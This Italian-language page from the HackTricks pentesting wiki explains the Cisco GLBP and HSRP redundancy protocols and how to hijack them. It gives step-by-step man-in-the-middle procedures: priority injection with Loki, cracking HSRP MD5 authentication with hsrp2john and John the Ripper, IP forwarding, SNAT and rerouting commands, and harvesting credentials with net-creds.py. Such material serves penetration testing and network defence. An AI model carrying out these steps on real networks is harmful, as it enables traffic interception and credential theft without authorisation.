# GLBP & HSRP Attacks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## FHRP Hijacking Overview

### Insights into FHRP
FHRP √® progettato per fornire robustezza alla rete unendo pi√π router in una singola unit√† virtuale, migliorando cos√¨ la distribuzione del carico e la tolleranza ai guasti. Cisco Systems ha introdotto protocolli di spicco in questo insieme, come GLBP e HSRP.

### GLBP Protocol Insights
La creazione di Cisco, GLBP, funziona sullo stack TCP/IP, utilizzando UDP sulla porta 3222 per la comunicazione. I router in un gruppo GLBP scambiano pacchetti "hello" a intervalli di 3 secondi. Se un router non riesce a inviare questi pacchetti per 10 secondi, si presume che sia offline. Tuttavia, questi timer non sono fissi e possono essere modificati.

### GLBP Operations and Load Distribution
GLBP si distingue per la possibilit√† di distribuire il carico tra i router utilizzando un singolo IP virtuale abbinato a pi√π indirizzi MAC virtuali. In un gruppo GLBP, ogni router √® coinvolto nell'inoltro dei pacchetti. A differenza di HSRP/VRRP, GLBP offre un vero bilanciamento del carico attraverso diversi meccanismi:

- **Host-Dependent Load Balancing:** Mantiene un'assegnazione costante dell'indirizzo MAC AVF a un host, essenziale per configurazioni NAT stabili.
- **Round-Robin Load Balancing:** L'approccio predefinito, alternando l'assegnazione dell'indirizzo MAC AVF tra gli host richiedenti.
- **Weighted Round-Robin Load Balancing:** Distribuisce il carico in base a metriche di "Peso" predefinite.

### Key Components and Terminologies in GLBP
- **AVG (Active Virtual Gateway):** Il router principale, responsabile dell'assegnazione degli indirizzi MAC ai router peer.
- **AVF (Active Virtual Forwarder):** Un router designato per gestire il traffico di rete.
- **GLBP Priority:** Una metrica che determina l'AVG, partendo da un valore predefinito di 100 e variando tra 1 e 255.
- **GLBP Weight:** Riflette il carico attuale su un router, regolabile manualmente o tramite Object Tracking.
- **GLBP Virtual IP Address:** Funziona come gateway predefinito della rete per tutti i dispositivi connessi.

Per le interazioni, GLBP utilizza l'indirizzo multicast riservato 224.0.0.102 e la porta UDP 3222. I router trasmettono pacchetti "hello" a intervalli di 3 secondi e sono considerati non operativi se un pacchetto viene perso per una durata di 10 secondi.

### GLBP Attack Mechanism
Un attaccante pu√≤ diventare il router principale inviando un pacchetto GLBP con il valore di priorit√† pi√π alto (255). Questo pu√≤ portare a attacchi DoS o MITM, consentendo l'intercettazione o la reindirizzazione del traffico.

### Executing a GLBP Attack with Loki
[Loki](https://github.com/raizo62/loki_on_kali) pu√≤ eseguire un attacco GLBP iniettando un pacchetto con priorit√† e peso impostati a 255. I passaggi pre-attacco comportano la raccolta di informazioni come l'indirizzo IP virtuale, la presenza di autenticazione e i valori di priorit√† del router utilizzando strumenti come Wireshark.

Attack Steps:
1. Passare alla modalit√† promiscuous e abilitare l'inoltro IP.
2. Identificare il router target e recuperare il suo IP.
3. Generare un ARP Gratuitous.
4. Iniettare un pacchetto GLBP malevolo, impersonando l'AVG.
5. Assegnare un indirizzo IP secondario all'interfaccia di rete dell'attaccante, rispecchiando l'IP virtuale GLBP.
6. Implementare SNAT per una visibilit√† completa del traffico.
7. Regolare il routing per garantire l'accesso continuo a Internet attraverso il router AVG originale.

Seguendo questi passaggi, l'attaccante si posiziona come un "uomo nel mezzo", in grado di intercettare e analizzare il traffico di rete, inclusi dati non crittografati o sensibili.

Per la dimostrazione, ecco i frammenti di comando richiesti:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Monitoring e intercettazione del traffico possono essere effettuati utilizzando net-creds.py o strumenti simili per catturare e analizzare i dati che scorrono attraverso la rete compromessa.

### Spiegazione Passiva dell'Hijacking HSRP con Dettagli sui Comandi

#### Panoramica di HSRP (Hot Standby Router/Redundancy Protocol)
HSRP √® un protocollo proprietario Cisco progettato per la ridondanza del gateway di rete. Consente la configurazione di pi√π router fisici in un'unica unit√† logica con un indirizzo IP condiviso. Questa unit√† logica √® gestita da un router primario responsabile della direzione del traffico. A differenza di GLBP, che utilizza metriche come priorit√† e peso per il bilanciamento del carico, HSRP si basa su un singolo router attivo per la gestione del traffico.

#### Ruoli e Terminologia in HSRP
- **Router Attivo HSRP**: Il dispositivo che funge da gateway, gestendo il flusso di traffico.
- **Router Standby HSRP**: Un router di backup, pronto a subentrare se il router attivo fallisce.
- **Gruppo HSRP**: Un insieme di router che collaborano per formare un singolo router virtuale resiliente.
- **Indirizzo MAC HSRP**: Un indirizzo MAC virtuale assegnato al router logico nella configurazione HSRP.
- **Indirizzo IP Virtuale HSRP**: L'indirizzo IP virtuale del gruppo HSRP, che funge da gateway predefinito per i dispositivi connessi.

#### Versioni HSRP
HSRP √® disponibile in due versioni, HSRPv1 e HSRPv2, che differiscono principalmente nella capacit√† del gruppo, nell'uso dell'IP multicast e nella struttura dell'indirizzo MAC virtuale. Il protocollo utilizza indirizzi IP multicast specifici per lo scambio di informazioni di servizio, con pacchetti Hello inviati ogni 3 secondi. Un router √® considerato inattivo se non viene ricevuto alcun pacchetto entro un intervallo di 10 secondi.

#### Meccanismo di Attacco HSRP
Gli attacchi HSRP comportano l'assunzione forzata del ruolo del Router Attivo iniettando un valore di priorit√† massimo. Questo pu√≤ portare a un attacco Man-In-The-Middle (MITM). I passaggi essenziali pre-attacco includono la raccolta di dati sulla configurazione HSRP, che pu√≤ essere effettuata utilizzando Wireshark per l'analisi del traffico.

#### Passaggi per Bypassare l'Autenticazione HSRP
1. Salva il traffico di rete contenente dati HSRP come file .pcap.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Estrai gli hash MD5 dal file .pcap utilizzando hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Cracca gli hash MD5 utilizzando John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Esecuzione dell'Iniezione HSRP con Loki**

1. Avvia Loki per identificare le pubblicit√† HSRP.
2. Imposta l'interfaccia di rete in modalit√† promiscuo e abilita l'inoltro IP.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Usa Loki per mirare al router specifico, inserisci la password HSRP craccata e esegui le configurazioni necessarie per impersonare il Router Attivo.
4. Dopo aver ottenuto il ruolo del Router Attivo, configura la tua interfaccia di rete e le tabelle IP per intercettare il traffico legittimo.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Modifica la tabella di routing per instradare il traffico attraverso il precedente Router Attivo.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Usa net-creds.py o un'utilit√† simile per catturare le credenziali dal traffico intercettato.
```shell
sudo python2 net-creds.py -i eth0
```

Eseguire questi passaggi pone l'attaccante in una posizione per intercettare e manipolare il traffico, simile alla procedura per l'hijacking GLBP. Questo evidenzia la vulnerabilit√† nei protocolli di ridondanza come HSRP e la necessit√† di misure di sicurezza robuste.


## Riferimenti
- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Impara e pratica Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>
{% endhint %}
